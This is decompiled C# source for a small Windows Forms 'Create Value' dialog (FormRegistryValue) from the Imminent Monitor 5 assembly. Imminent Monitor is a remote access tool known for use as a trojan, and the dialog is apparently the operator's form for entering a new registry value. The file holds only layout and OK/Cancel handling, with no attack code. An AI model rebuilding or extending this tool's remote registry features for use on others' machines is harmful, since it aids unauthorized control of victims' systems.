// Decompiled with JetBrains decompiler
// Type: FormRegistryValue
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormRegistryValue : Form
{
  private IContainer icontainer_0;
  private Button button_0;
  private Button button_1;
  private Label label_0;
  private TextBox textBox_0;
  private Label label_1;
  private GClass29 gclass29_0;
  public string string_0;

  public FormRegistryValue(
    string string_1,
    string string_2,
    string string_3,
    string string_4,
    string string_5)
  {
    this.Load += new EventHandler(this.FormRegistryValue_Load);
    this.InitializeComponent();
    this.Text = string_1;
    this.vmethod_2().Text = string_2;
    this.vmethod_8().Text = string_3;
    this.vmethod_4().Text = string_4;
    this.string_0 = string_5;
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.vmethod_1(new Button());
    this.vmethod_3(new Button());
    this.vmethod_5(new Label());
    this.vmethod_7(new TextBox());
    this.vmethod_9(new Label());
    this.vmethod_11(new GClass29());
    this.SuspendLayout();
    this.vmethod_0().Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
    Button button1 = this.vmethod_0();
    Point point1 = new Point(130, 126);
    Point point2 = point1;
    button1.Location = point2;
    this.vmethod_0().Name = "ButtonCancel";
    Button button2 = this.vmethod_0();
    Size size1 = new Size(64, 25);
    Size size2 = size1;
    button2.Size = size2;
    this.vmethod_0().TabIndex = 10;
    this.vmethod_0().Text = "Cancel";
    this.vmethod_0().UseVisualStyleBackColor = true;
    this.vmethod_2().Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
    Button button3 = this.vmethod_2();
    point1 = new Point(199, 126);
    Point point3 = point1;
    button3.Location = point3;
    this.vmethod_2().Name = "ButtonOkay";
    Button button4 = this.vmethod_2();
    size1 = new Size(64, 25);
    Size size3 = size1;
    button4.Size = size3;
    this.vmethod_2().TabIndex = 9;
    this.vmethod_2().Text = "Okay";
    this.vmethod_2().UseVisualStyleBackColor = true;
    this.vmethod_4().AutoSize = true;
    Label label1 = this.vmethod_4();
    point1 = new Point(9, 49);
    Point point4 = point1;
    label1.Location = point4;
    this.vmethod_4().Name = "LabelTitle2";
    Label label2 = this.vmethod_4();
    size1 = new Size(61, 13);
    Size size4 = size1;
    label2.Size = size4;
    this.vmethod_4().TabIndex = 8;
    this.vmethod_4().Text = "LabelTitle2";
    this.vmethod_6().Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
    TextBox textBox1 = this.vmethod_6();
    point1 = new Point(11, 25);
    Point point5 = point1;
    textBox1.Location = point5;
    this.vmethod_6().Name = "TextBoxTitle1";
    TextBox textBox2 = this.vmethod_6();
    size1 = new Size(253, 22);
    Size size5 = size1;
    textBox2.Size = size5;
    this.vmethod_6().TabIndex = 7;
    this.vmethod_8().AutoSize = true;
    Label label3 = this.vmethod_8();
    point1 = new Point(9, 9);
    Point point6 = point1;
    label3.Location = point6;
    this.vmethod_8().Name = "LabelTitle1";
    Label label4 = this.vmethod_8();
    size1 = new Size(61, 13);
    Size size6 = size1;
    label4.Size = size6;
    this.vmethod_8().TabIndex = 6;
    this.vmethod_8().Text = "LabelTitle1";
    this.vmethod_10().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_10().BackColor = Color.FromArgb(171, 173, 179);
    GClass29 gclass29_1 = this.vmethod_10();
    point1 = new Point(11, 65);
    Point point7 = point1;
    gclass29_1.Location = point7;
    this.vmethod_10().Name = "Output";
    this.vmethod_10().method_1((string) null);
    GClass29 gclass29_2 = this.vmethod_10();
    size1 = new Size(252, 55);
    Size size7 = size1;
    gclass29_2.Size = size7;
    this.vmethod_10().TabIndex = 11;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    size1 = new Size(271, 161);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.vmethod_10());
    this.Controls.Add((Control) this.vmethod_0());
    this.Controls.Add((Control) this.vmethod_2());
    this.Controls.Add((Control) this.vmethod_4());
    this.Controls.Add((Control) this.vmethod_6());
    this.Controls.Add((Control) this.vmethod_8());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.FormBorderStyle = FormBorderStyle.FixedSingle;
    this.MaximizeBox = false;
    this.MinimizeBox = false;
    this.Name = nameof (FormRegistryValue);
    this.ShowIcon = false;
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "Create Value";
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual Button vmethod_0() => this.button_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(Button button_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_1);
    if (this.button_0 != null)
      this.button_0.Click -= eventHandler;
    this.button_0 = button_2;
    if (this.button_0 == null)
      return;
    this.button_0.Click += eventHandler;
  }

  internal virtual Button vmethod_2() => this.button_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(Button button_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_0);
    if (this.button_1 != null)
      this.button_1.Click -= eventHandler;
    this.button_1 = button_2;
    if (this.button_1 == null)
      return;
    this.button_1.Click += eventHandler;
  }

  internal virtual Label vmethod_4() => this.label_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(Label label_2) => this.label_0 = label_2;

  internal virtual TextBox vmethod_6() => this.textBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(TextBox textBox_1) => this.textBox_0 = textBox_1;

  internal virtual Label vmethod_8() => this.label_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(Label label_2) => this.label_1 = label_2;

  internal virtual GClass29 vmethod_10() => this.gclass29_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(GClass29 gclass29_1) => this.gclass29_0 = gclass29_1;

  private void FormRegistryValue_Load(object sender, EventArgs e)
  {
    this.MinimumSize = new Size(304, 197);
    Class97.smethod_11((Form) this);
  }

  private void method_0(object sender, EventArgs e)
  {
    if (Operators.CompareString(this.vmethod_6().Text, (string) null, false) == 0 || Operators.CompareString(this.vmethod_10().richTextBox_0.Text, (string) null, false) == 0)
      return;
    this.DialogResult = DialogResult.OK;
    this.Close();
  }

  private void method_1(object sender, EventArgs e)
  {
    this.DialogResult = DialogResult.Cancel;
    this.Close();
  }
}
